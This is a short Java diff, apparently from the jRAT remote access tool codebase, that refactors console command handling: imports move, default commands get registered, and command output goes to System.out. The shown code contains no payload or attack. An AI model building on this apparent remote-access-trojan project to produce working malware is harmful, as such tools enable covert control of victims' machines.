@@ -11,8 +11,9 @@ import javax.swing.JFileChooser;
 import javax.swing.JOptionPane;
 import javax.swing.UIManager;
 
+import pro.jrat.api.commands.Commands;
 import pro.jrat.api.events.OnDisableEvent;
-import pro.jrat.commands.Commands;
+import pro.jrat.commands.DefaultCommands;
 import pro.jrat.common.OperatingSystem;
 import pro.jrat.common.Version;
 import pro.jrat.extensions.Plugin;
@@ -149,11 +150,13 @@ public class Main {
 			}
 		}));
 
+		DefaultCommands.addDefault();
+		
 		BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
 		String s;
 		
 		while ((s = reader.readLine()) != null) {
-			Commands.execute(s);
+			Commands.execute(s, System.out);
 		}
 	}
 
